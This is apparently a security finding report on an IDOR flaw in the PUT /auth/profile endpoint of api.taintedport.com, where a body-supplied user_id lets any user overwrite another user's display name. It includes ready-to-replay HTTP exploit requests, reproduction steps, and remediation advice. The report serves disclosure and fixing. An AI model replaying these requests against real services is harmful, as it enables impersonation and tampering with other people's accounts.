# Horizontal IDOR on PUT /auth/profile via body user_id override — attacker can rewrite any user's display name

**ID:** vuln-0011
**Severity:** MEDIUM
**Found:** 2026-07-20 11:50:52 UTC
**Target:** https://api.taintedport.com
**Endpoint:** /auth/profile
**Method:** PUT
**CWE:** CWE-639
**CVSS:** 5.0 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:N/I:L/A:N)

## Description

The `PUT /auth/profile` endpoint on the taintedport.com API selects the target row of its UPDATE using a `user_id` value taken from the JSON request body, instead of using the authenticated `user_id` claim from the caller's JWT. Any authenticated user — including a freshly self-registered account with no prior state — can therefore overwrite the `name` column of any other user by supplying `"user_id": <victim_id>` in the request body.

The stored `name` is surfaced publicly across the application: it is echoed as `user_name` on the unauthenticated `GET /wines/{id}/reviews` listing and as `owner_name` on order detail endpoints. Rewriting a victim's name silently attributes their existing content (reviews, orders) to an attacker-chosen string, and enables identity-swap attacks for phishing and social-engineering pivots.

Restricted-mass-assignment probing was performed on the same endpoint: parallel attempts to bind `email`, `password`, and `is_admin` on the victim row were silently ignored. The bug is therefore scoped strictly to display-name tampering — no direct account takeover or privilege escalation via this vector today. However, a future change that adds any additional bindable field to the endpoint would immediately promote this to a critical account-takeover primitive (see Conditions for Severity Increase).

## Attack Flow

```
┌────────────────────────────────────────────────────────────────────────┐
│  Horizontal IDOR — PUT /auth/profile (body user_id override)           │
└────────────────────────────────────────────────────────────────────────┘

  Prerequisites:
    • Self-registration is open (POST /auth/register → 201 + JWT)
    • Victim's numeric user_id is a 1..N auto-increment integer
      (leaked via GET /wines/{id}/reviews and GET /orders/{id})

  ┌───────────┐                                        ┌────────────────┐
  │ ATTACKER  │                                        │  TAINTEDPORT   │
  │  (any     │                                        │      API       │
  │  user)    │                                        │                │
  └─────┬─────┘                                        └────────┬───────┘
        │                                                       │
   ┌────┴────┐  ① POST /auth/register {email,password}          │
   │ Phase 1 ├──────────────────────────────────────────────────►
   │ acquire │  201 Created {token: <JWT sub=user_id 445>,      │
   │  JWT    │◄──────────────  user:{id:445, ...}}              │
   └────┬────┘                                                   │
        │                                                       │
   ┌────┴────┐  ② PUT /auth/profile                             │
   │ Phase 2 │     Authorization: Bearer <JWT for user_id 445>  │
   │ exploit │     Content-Type: application/json               │
   │         │     {"user_id": 446, "name": "PWNED"}            │
   │         ├──────────────────────────────────────────────────►
   │         │                                                   │
   │         │    ┌──────────────────────────────────────────┐  │
   │         │    │  ROOT CAUSE (server-side)                │  │
   │         │    │  UPDATE users SET name = :body_name      │  │
   │         │    │  WHERE user_id = :body_user_id ← UNSAFE  │  │
   │         │    │                                          │  │
   │         │    │  Should use JWT claim, not body field:   │  │
   │         │    │  WHERE user_id = :jwt_user_id            │  │
   │         │    └──────────────────────────────────────────┘  │
   │         │                                                   │
   │         │  200 OK {user:{id:446, name:"PWNED", ...}}       │
   │         │◄──────────────────────────────────────────────────
   └────┬────┘         ▲                                         │
        │              │                                         │
        │              └─ server confirms write targeted         │
        │                 user_id 446 (VICTIM), not the caller.  │
        │                                                       │
   ┌────┴────┐  ③ Downstream impersonation:                     │
   │ Phase 3 │     GET /wines/1/reviews  (unauthenticated)      │
   │ impact  ├──────────────────────────────────────────────────►
   │         │  200 OK  [ { id: 126,                            │
   │         │            comment:"legit victim review",        │
   │         │            user_name: "PWNED"  ← changed         │
   │         │          }, ... ]                                │
   │         │◄──────────────────────────────────────────────────
   └────┬────┘                                                   │
        │                                                       │
   ┌────┴────┐  ④ Independent verification (as victim):         │
   │ verify  │     GET /auth/me                                 │
   │         │     Authorization: Bearer <VICTIM JWT — 446>     │
   │         ├──────────────────────────────────────────────────►
   │         │  200 OK {user:{id:446, name:"PWNED",             │
   │         │           is_admin:false, email:"...unchanged"}} │
   │         │◄──────────────────────────────────────────────────
   └─────────┘                                                   │
                                                                 │
  What is modified:    victim's display `name` column            │
  What is NOT affected: is_admin, email, password (verified)     │
  Public surface:      /wines/{id}/reviews, /orders/{id}         │
                                                                 │
  Detection: any PUT /auth/profile where body.user_id != jwt     │
  user_id is unambiguous exploitation.                           │
```

## Impact

Any authenticated attacker (including a net-new self-registration) can silently change the public display name of any other user account on the platform. Directly demonstrated consequences:

* Review-author impersonation. The stored `name` is served as `user_name` on the unauthenticated `GET /wines/{id}/reviews` endpoint. An attacker can rewrite a trusted reviewer's name to a discrediting or offensive string, or rewrite their own name to a victim's identity and post reviews under that identity.
* Order-detail impersonation. The same name is served as `owner_name` on order-detail endpoints, letting an attacker plant an arbitrary identity on any order that other users (including administrators) view.
* Reputation damage / harassment. Any user's public identity can be arbitrarily changed by anyone else, with no notification to the victim.
* Chain amplifier. Combined with the existing stored-XSS/CSP weaknesses noted elsewhere, an attacker who plants a poisoned review under a victim's rewritten identity gains stealth and blast-radius.

Direct write access to `email`, `password`, and `is_admin` was tested and confirmed NOT available via this vector today, so the finding is scoped to display-name tampering only. The victim receives no warning and no in-band notification that their identity has been changed.

## Technical Analysis

Two independent authorization failures compound in the handler for `PUT /auth/profile`:

1. Object-level authorization missing (CWE-639 / BOLA). The handler does not check that the body-supplied `user_id` matches the JWT-derived `user_id`, and no admin-role override exists either. Any authenticated principal is treated as authorized to modify any row.

2. Untrusted key used for row selection. The `user_id` field is deserialized from the request body and used verbatim in the UPDATE's WHERE clause, instead of using the trusted claim from the verified JWT.

Independent black-box verification isolated the exact untrusted field:

- Payload `{"user_id":<victim>, "name":<x>}` from an attacker JWT ⇒ the response echoes `user.id=<victim>` and a subsequent `GET /auth/me` presented with the victim's token confirms the victim's row now stores `<x>`. Attacker's own row is unchanged.
- Payload `{"id":<victim>, "name":<x>}` ⇒ the attacker's OWN row is updated (the `id` key is ignored); confirms the untrusted key is specifically `user_id`.
- Payload `{"user_id":<victim>, "name":<x>, "is_admin":1, "email":"...", "password":"..."}` ⇒ HTTP 200, name overwritten on victim row, but `is_admin`, `email`, and `password` remain unchanged (victim can still authenticate with their original password). The mass-assignment surface is narrow: only `name`.

Prerequisites are minimal. Victim identifiers are 1..N auto-increment integers already disclosed by other endpoints (e.g. `GET /wines/{id}/reviews` returns `user_name` per review — combined with an enumeration or order lookup an attacker can trivially map names to IDs). Only a valid Bearer token (any user role) is required, and self-registration is open.

Correct behavior: derive the target row's identifier exclusively from the verified JWT claim (or from a server-side session lookup) and reject or drop any body-supplied `user_id`.

## Proof of Concept

Reproduction against `https://api.taintedport.com` (fresh accounts, no reliance on any pre-existing state):

1. Register attacker — `POST /auth/register` with `{"name":"AttOrig","email":"<random>@example.com","password":"…"}` → HTTP 201, receive a JWT and `user.id` (say attacker_id = 445).
2. Register victim (independently, for verification) — same call with a different email → HTTP 201, receive victim JWT and victim_id (say 446).
3. Exploit — send `PUT /auth/profile` with `Authorization: Bearer <attacker JWT>` and body `{"user_id": 446, "name": "PWN-BY-VALIDATOR-<ts>"}`. Server returns HTTP 200 with `user.id == 446` and `user.name == "PWN-BY-VALIDATOR-<ts>"`, even though the Bearer token belongs to user_id 445.
4. Verify write landed on victim row — `GET /auth/me` presented with the victim's token returns `name:"PWN-BY-VALIDATOR-<ts>"`. `GET /auth/me` with the attacker's token still returns the attacker's original name.
5. Verify downstream impact — have the victim post a review (`POST /wines/1/reviews`), then re-issue the rename, then hit unauthenticated `GET /wines/1/reviews`; the victim's review is now attributed to the attacker-chosen `user_name`.

Negative controls actually run:
- Payload with `id` (not `user_id`) updates the attacker's own row → identifies `user_id` as the specific untrusted key.
- Payload including `is_admin`, `email`, `password` alongside the `user_id` override: only `name` is written; victim still authenticates with original password.

Included artefacts:
- `/workspace/validation/idor-profile-user-id-override/poc/poc.py` — headed, colored, step-by-step exploit that self-registers both accounts and shows the impersonation on the public reviews listing.
- `/workspace/validation/idor-profile-user-id-override/poc/verify.py` — regression test that exits 0 (VULNERABLE) or 1 (NOT VULNERABLE).

```
See poc_script_path — the full poc.py is stored at /workspace/validation/idor-profile-user-id-override/poc/poc.py
```

## Evidence

### 1. Register attacker (fresh account)

**Request:**
```http
POST /auth/register HTTP/1.1
Host: api.taintedport.com
Content-Type: application/json

{"name":"AttOrig","email":"validator-att-1784547930@example.com","password":"ValidatorPw!2026"}
```

**Response:**
```http
HTTP/1.1 201 Created
Content-Type: application/json

{"success":true,"message":"User registered successfully","token":"<attacker JWT for user_id=445>","user":{"id":445,"name":"AttOrig","email":"validator-att-1784547930@example.com","is_admin":false}}
```

> Obtain a low-privilege attacker JWT by self-registration. No admin approval or email verification is required.

### 2. Register victim (fresh account)

**Request:**
```http
POST /auth/register HTTP/1.1
Host: api.taintedport.com
Content-Type: application/json

{"name":"VicOrig","email":"validator-vic-1784547930@example.com","password":"ValidatorPw!2026"}
```

**Response:**
```http
HTTP/1.1 201 Created

{"success":true,"token":"<victim JWT for user_id=446>","user":{"id":446,"name":"VicOrig","is_admin":false}}
```

> Establish an independent victim account so we can independently verify the write landed on the victim row.

### 3. Attacker overrides victim row via body user_id

**Request:**
```http
PUT /auth/profile HTTP/1.1
Host: api.taintedport.com
Authorization: Bearer <attacker JWT for user_id=445>
Content-Type: application/json

{"user_id": 446, "name": "PWN-BY-VALIDATOR-1784547930"}
```

**Response:**
```http
HTTP/1.1 200 OK
Content-Type: application/json

{"success":true,"message":"Profile updated successfully.","user":{"id":446,"name":"PWN-BY-VALIDATOR-1784547930","email":"validator-vic-1784547930@example.com","is_admin":0,"totp_enabled":false,"created_at":"2026-07-20 11:45:30"}}
```

> The server echoes user.id=446 (the VICTIM), even though the Bearer token belongs to user_id=445. Root cause: the UPDATE binds WHERE to the body-supplied user_id instead of the JWT claim.

### 4. Victim's own /auth/me confirms row was modified

**Request:**
```http
GET /auth/me HTTP/1.1
Host: api.taintedport.com
Authorization: Bearer <victim JWT for user_id=446>
```

**Response:**
```http
HTTP/1.1 200 OK

{"success":true,"user":{"id":446,"name":"PWN-BY-VALIDATOR-1784547930","email":"validator-vic-1784547930@example.com","is_admin":false,"totp_enabled":false,"created_at":"2026-07-20 11:45:30"}}
```

> Independent verification using the victim's own credentials - the victim's stored name is now the attacker-chosen value.

### 5. Attacker /auth/me - attacker row untouched

**Request:**
```http
GET /auth/me HTTP/1.1
Host: api.taintedport.com
Authorization: Bearer <attacker JWT for user_id=445>
```

**Response:**
```http
HTTP/1.1 200 OK

{"success":true,"user":{"id":445,"name":"AttOrig","email":"validator-att-1784547930@example.com","is_admin":false,"totp_enabled":false,"created_at":"2026-07-20 11:45:30"}}
```

> Rules out the alternative hypothesis of a mislabeled response - the attacker's own row was NOT changed; only the victim's was.

### 6. Mass-assignment scoping: is_admin/email/password ignored

**Request:**
```http
PUT /auth/profile HTTP/1.1
Host: api.taintedport.com
Authorization: Bearer <attacker JWT for user_id=448>
Content-Type: application/json

{"user_id":449,"name":"MassAssignName","is_admin":1,"email":"hijacked@evil.com","password":"hijacked"}
```

**Response:**
```http
HTTP/1.1 200 OK

{"success":true,"user":{"id":449,"name":"MassAssignName","email":"validator-vic2-1784547942@example.com","is_admin":0,"totp_enabled":false,"created_at":"2026-07-20 11:45:43"}}
```

> The name was overwritten on the victim row, but email/is_admin remained unchanged and the victim's original password still authenticates. Scoped strictly to display-name tampering.

### 7. Downstream impact: public reviews show the hijacked name

**Request:**
```http
GET /wines/1/reviews HTTP/1.1
Host: api.taintedport.com
```

**Response:**
```http
HTTP/1.1 200 OK

{"success":true,"reviews":[{"id":126,"rating":5,"comment":"validator test review","created_at":"2026-07-20 11:45:56","user_name":"ATTACKER-IMPERSONATE-1784547955"}, ...]}
```

> The victim's review is now attributed to the attacker-chosen display name on the public wine-detail reviews endpoint. No authentication is required to view this listing, so the impersonation is publicly visible.


## Remediation

1. Derive the target row exclusively from the authenticated principal. On `PUT /auth/profile`, change the UPDATE's WHERE clause from `WHERE user_id = :body_user_id` to `WHERE user_id = :jwt_user_id`, where `jwt_user_id` comes from the verified JWT claim (or the server-side session). Any `user_id` present in the request body must be rejected or silently dropped by the deserializer — never used for row selection or content.

2. Explicit allow-list of bindable fields. The only legitimate field on this endpoint is `name`. Adopt a schema-driven request DTO (e.g. Pydantic/marshmallow/DRF serializer) that lists exactly the bindable fields; unknown or forbidden keys (`user_id`, `id`, `email`, `password`, `is_admin`, `totp_*`, `created_at`, …) must fail validation, not be filtered ad-hoc in the handler.

3. Regression tests. Add integration tests that assert:
   - An attacker cannot update another user's `name` via body-supplied `user_id`.
   - Body-supplied `user_id` and `id` fields are ignored (updates always target the caller's row).
   - Attempts to bind `is_admin`, `email`, `password` via this endpoint have no effect on the target row.
   Each test should assert both the response body and a follow-up `GET /auth/me` on the intended-victim account.

4. Audit sibling endpoints for the same pattern. `POST /cart/add`, `PUT /cart/update`, `DELETE /cart/remove/{wine_id}`, `POST /orders`, and `POST /wines/{id}/reviews` all accept a JSON body and currently ignore body-supplied `user_id`. Add negative tests to lock that invariant in place so a future refactor does not reintroduce the same bug.

5. Consider stronger contract. Rename to `PUT /auth/me` (or `PATCH /me`) semantics so no `id` appears in path or body — this makes the correct behavior obvious to future maintainers.

6. Notify users on identity changes. Even after fix, consider emailing the account owner when their `name` changes, so any residual abuse (e.g. by an insider) is visible.

## Conditions for Severity Increase

If the endpoint later accepts any additional bindable field via the same body-supplied `user_id` selector — even accidentally (e.g. adding `email` to the update, or reintroducing `is_admin` binding) — this immediately becomes account takeover / privilege escalation (Confidentiality/Integrity → H, CVSS ≥ 8.8 Critical).

If the SPA or a future "edit review" verb renders `user_name` via `dangerouslySetInnerHTML` / raw HTML without escaping, the display-name tampering becomes a stored-XSS delivery channel — chained with the existing reviews stored-XSS candidate and permissive CORS, blast radius and confidentiality impact rise sharply (chain CVSS typically 8.0+).

Neither of those conditions is present today, but both are one-line code changes away.
